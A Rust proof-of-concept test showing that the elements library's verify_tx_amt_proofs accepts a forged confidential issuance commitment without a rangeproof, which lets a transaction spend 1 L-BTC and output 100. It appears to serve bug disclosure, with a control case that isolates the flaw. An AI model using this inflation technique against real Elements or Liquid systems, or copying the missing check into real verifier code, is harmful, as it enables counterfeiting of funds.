//! PoC: `Transaction::verify_tx_amt_proofs` accepts confidential *issuance* amount
//! commitments without verifying any rangeproof, letting an attacker satisfy the
//! aggregate balance check while creating value out of thin air.
//!
//! This test builds a transaction that spends 1 L-BTC and outputs 100 L-BTC,
//! with the missing 99 L-BTC supplied by an unverified confidential issuance
//! amount commitment. `verify_tx_amt_proofs` is expected to return `Ok(())`.

use elements::confidential::{Asset, Nonce, Value};
use elements::{
    AssetBlindingNonce, AssetEntropy, AssetId, AssetIssuance, LockTime, OutPoint, Script,
    Transaction, TxIn, TxOut, TxOutWitness,
};
use secp256k1_zkp::{Generator, PedersenCommitment, Secp256k1};

#[test]
fn confidential_issuance_amount_needs_no_rangeproof() {
    let secp = Secp256k1::new();
    let asset = AssetId::LIQUID_BTC;

    // Honest spent UTXO: 1 L-BTC, explicit (so its commitment is 1*G_LBTC).
    let spent_utxo = TxOut {
        asset: Asset::Explicit(asset),
        value: Value::Explicit(1),
        nonce: Nonce::Null,
        script_pubkey: Script::new(),
        witness: TxOutWitness::default(),
    };

    // Forged "confidential issuance amount": the curve point 99*G_LBTC.
    // It is not a valid opening of anything meaningful; no rangeproof is
    // produced for it (TxInWitness::default() has an EMPTY amount_rangeproof).
    let gen = Generator::new_unblinded(&secp, asset.into_tag());
    let forged_issuance_commitment = PedersenCommitment::new_unblinded(&secp, 99, gen);

    let input = TxIn {
        previous_output: OutPoint::default(),
        asset_issuance: AssetIssuance {
            asset_blinding_nonce: AssetBlindingNonce::NEW_ISSUANCE,
            asset_entropy: AssetEntropy::NEW_ISSUANCE,
            amount: Value::Confidential(forged_issuance_commitment),
            inflation_keys: Value::Null, // never touched
        },
        ..Default::default() // witness.amount_rangeproof is EMPTY
    };

    // Attacker output: 100 L-BTC, explicit (no rangeproof / surjection proof required).
    let output = TxOut {
        asset: Asset::Explicit(asset),
        value: Value::Explicit(100),
        nonce: Nonce::Null,
        script_pubkey: Script::new(),
        witness: TxOutWitness::default(),
    };

    let tx = Transaction {
        version: 2,
        lock_time: LockTime::ZERO,
        input: vec![input],
        output: vec![output],
    };

    // Balance seen by the library:
    //   in  = 1*G_LBTC (spent utxo) + 99*G_LBTC (forged issuance) = 100*G_LBTC
    //   out = 100*G_LBTC
    // Nothing constrains the forged issuance point, so the check passes and the
    // tx is reported as value-conserving even though it mints 99 L-BTC.
    tx.verify_tx_amt_proofs(&secp, &[spent_utxo.clone()])
        .expect("BUG: library accepted a value-inflating transaction");

    // CONTROL: the identical tx with the forged issuance removed must be
    // rejected, proving the test (and the balance check) is not vacuous and
    // that the forged issuance commitment is the only thing making it pass.
    let mut control = tx.clone();
    control.input[0].asset_issuance.amount = Value::Null;
    assert_eq!(
        control.verify_tx_amt_proofs(&secp, &[spent_utxo]),
        Err(elements::VerificationError::BalanceCheckFailed),
        "control tx without the forged issuance should fail the balance check"
    );
}
